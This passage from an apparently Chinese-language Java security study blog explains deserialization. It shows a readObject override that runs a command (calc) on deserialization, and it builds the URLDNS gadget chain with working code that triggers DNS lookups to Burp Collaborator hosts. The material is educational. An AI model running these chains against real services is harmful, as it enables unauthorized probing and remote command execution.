class="hljs-attribute">age</span>=24&#125;<br></code></pre></td></tr></table></figure><h3 id="0x04-java反序列化实例"><a href="#0x04-java反序列化实例" class="headerlink" title="0x04 java反序列化实例"></a>0x04 java反序列化实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//参考https://xilitter.github.io/2023/02/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</span><br><span class="hljs-comment">//Persion改成Person</span><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">persion</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Persion</span>(<span class="hljs-string">&quot;notbad3&quot;</span>,<span class="hljs-number">23</span>);<span class="hljs-comment">//实例化一个对象</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">//它是一个字节数组输出流，用于将序列化后的对象输出到字节数组中。</span><br>        <span class="hljs-type">ObjectOutputStream</span>  <span class="hljs-variable">ObjectOutputStream</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-comment">//将persion对象序列化输出到byteArrayOutputStream对象中</span><br>        ObjectOutputStream.writeObject(persion);<br>       <br>        System.out.println(byteArrayOutputStream);<span class="hljs-comment">//打印</span><br>        System.out.println(<span class="hljs-string">&quot;------------------------&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//将二进制数据输出到文件中</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>        <span class="hljs-comment">//序列化</span><br>        oos.writeObject(persion);<br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;data.bin&quot;</span>);<br>        <span class="hljs-comment">//创建对象从二进制文件中读取</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">Persion</span> <span class="hljs-variable">newpersion</span> <span class="hljs-operator">=</span>(Persion) objectInputStream.readObject();<br>        <span class="hljs-comment">//从 fileInputStream 中读取序列化后的对象，并将其转换成 Persion 对象类型。</span><br>        System.out.println(newpersion);<span class="hljs-comment">//反序列化输出调用tostring函数，因为这里我们把一个对象输出了</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Persion</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><span class="hljs-comment">//    private transient String name;</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Persion</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在反序列化过程中会调用<code>toString</code>函数，将字符串输出出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Persion&#123;&quot;</span>+<span class="hljs-string">&quot;&#x27;name&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;,&#x27;age&#x27;=&quot;</span>+<span class="hljs-built_in">this</span>.age+<span class="hljs-string">&quot;&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这东西其实就是<code>toString</code>的重写</p><p><img src="/img/javaafan2.png" alt="javaafan2"></p><p>​如果不重写使用默认的<code>toString</code>方法，<code>toString()</code> 方法会返回一个字符串，其中包含类的名称，后跟一个 ‘@’ 符号和对象的哈希码:</p><p><img src="/img/javafan5.png" alt="javafan5"></p><p>​我们可以使用<code>transient</code>关键字，将一些重要的信息（如密码）不被进行序列化，如果某个属性被<code>transient</code>关键字修饰的话，则该属性不会参与到序列化的过程，此时将其进行反序列化后，如果该属性是引用数据类型，则返回的是 null，如果该属性是基本数据类型（如 int 类型），则会返回默认值 0（当然，boolean 的默认值是 false）。在上面那段代码的基础上做如下修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//private String name; - &gt; private transient String name;</span><br></code></pre></td></tr></table></figure><p><img src="/img/javaafan3.png" alt="javaafan3"></p><h3 id="0x05-重写"><a href="#0x05-重写" class="headerlink" title="0x05 重写"></a>0x05 重写</h3><p>​上面的栗子中对<code>toString</code>方法进行了重写，在实现 <code>Serializable</code> 接口的同时，还可以重写 <code>writeObject() </code>和<code>readObject()</code>方法，这样一旦对象被序列化或被反序列化，就会自动的调用这两个方法，而不会使用默认的序列化机制。</p><p>​造成反序列化最重要的一点就是如果被反序列化的类重写了<code>writeObject</code>和<code>readObject</code>方法，<code>java</code>就会调用重写的方法。如果该重写方法中添加了恶意的，能执行命令的代码，就会达到反序列化攻击的目的。比如还是之前的<code>Person</code>类，但我重写了该类中的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name:&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span>+<br>                <span class="hljs-string">&quot;, age:&quot;</span> + age +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述代码重写了readObject方法，并且添加了弹出计算器的命令，反序列化时会执行它的<code>readObject</code>，看看效果：</p><p><img src="/img/javafan4.png" alt="javafan4"></p><p>​成功弹出计算器。这样攻击看起来很方便，直接在服务端上传一个重写了readObject方法的类的序列化串，直接能够命令执行。但是这种方式几乎不会出现。为什么？作为后端开发人员，不可能会在代码中留下这么危险的readObject方法，即使有，无源码的情况下，我们也不会知道所属该方法的类名。（因为服务端反序列化的也只有自己的类）普遍的反序列化攻击方式包含三个部分：</p><blockquote><p>入口类：重写了readObject方法，并且是能够被反序列化的，最好是jdk自带的。例如HashMap</p><p>调用链：一个类的方法包含另一个类调用同名同类型的方法</p><p>执行类：能够命令执行或者远程写文件的类</p></blockquote><h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>入口类选择了<code>Hashmap</code>，跟进查看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//继承了Serializable接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br><span class="hljs-comment">//重写了readObject方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br><span class="hljs-comment">//后面省略</span><br></code></pre></td></tr></table></figure><p>服务端发起DNS请求，找<code>URL</code>类看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//同样可以被反序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URL</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BUILTIN_HANDLERS_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun.net.www.protocol&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">7627629688361524110L</span>;<br><span class="hljs-comment">//存在同名函数hashCode</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br><span class="hljs-comment">//handler.hashCode函数</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Generate the protocol part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// Generate the host part.</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br><br></code></pre></td></tr></table></figure><p>最终会在<code>URLStreamHandler</code>类调用<code>getHostAddress</code>函数发起域名解析请求。所以这条链就只有两部分<code>HashMap-&gt;URL</code>。</p><p>而且，<code>HashMap</code>中<code>readObject</code>调用了<code>hash</code>方法，在<code>hash</code>方法中也调用了<code>hashcode</code>方法，正好可以走到<code>URL</code>的<code>hashcode</code>里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;viper1.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ezh5awfh6q670nk11meskg0gr7xxlm.burpcollaborator.net&quot;</span>),<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br></code></pre></td></tr></table></figure><p>但上述代码在序列化过程中也会发起DNS请求：</p><p><img src="/img/javafanstudy1.png" alt="javafanstudy1"></p><p>甚至没有序列化都会收到请求，为什么？跟进到<code>put</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>为了确保键的唯一性，它会去计算key的hash值，跟进hash方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>它最后也会调用hashCode方法。所以在put的时候它就发起了一个DNS请求:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ezh5awfh6q670nk11meskg0gr7xxlm.burpcollaborator.net&quot;</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>另外，在我们分析攻击链的时候，如果hashCode的值不等于-1，就会返回hashCode，而不会去调用handler.hashCode。它在初始化的时候为-1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br><span class="hljs-comment">//---------------------------------------------</span><br> <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>接下来调用put函数的时候，hashCode就变成了key的哈希值。也就是说，在反序列化的时候并不会发起DNS请求(不满足hashCode的条件)，这就是一个无效链，所以我们需要调整一下代码。</p><blockquote><p>1.序列化不发起请求。</p><p>2.在put后hashcode的值为-1。</p><p>可以通过反射改变已有对象的属性。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;viper00.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">/*Person person = new Person(&quot;rdj&quot;,24);</span><br><span class="hljs-comment">        System.out.println(person);</span><br><span class="hljs-comment">        serialize(person);*/</span><br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://rvqbods4viqkcjfzeunt7qij7ad01p.burpcollaborator.net&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcode1</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcode1.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcode1.set(url,<span class="hljs-number">1234</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到此时没有收到新的DNS请求：</p><p><img src="/img/javafanstudy2.png" alt="javafanstudy2"></p><p>然后反序列化就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        unserialize(<span class="hljs-string">&quot;viper00.txt&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实关键代码就这么几行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://rvqbods4viqkcjfzeunt7qij7ad01p.burpcollaborator.net&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcode1</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcode1.setAccessible(<span class="hljs-literal">true</span>);<br>hashcode1.set(url,<span class="hljs-number">1234</span>);<br>hashMap.put(url,<span class="hljs-number">1</span>);<br>serialize(hashMap);<br></code></pre></td></tr></table></figure><p>入口A：Hashmap 接收一个参数O</p><p>目标类B：URL</p><p>目标调用B.f</p><p>A.readPbject -&gt; O.f(这时我们传进去B被当成O，也就调用了B.f)</p><blockquote><p>我们的入口类是HashMap，在反序列化的时候，它会调用重写的readObject方法，而在该方法里，它会计算第一个参数，也就是key的hash值，进而调用hash函数，进而调用key的hashCode函数。而我们的目标方法就是URL原生类的hashCode方法，满足调用链的同名同类型，让key传入URL对象，即为完整的攻击链。</p></blockquote><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span 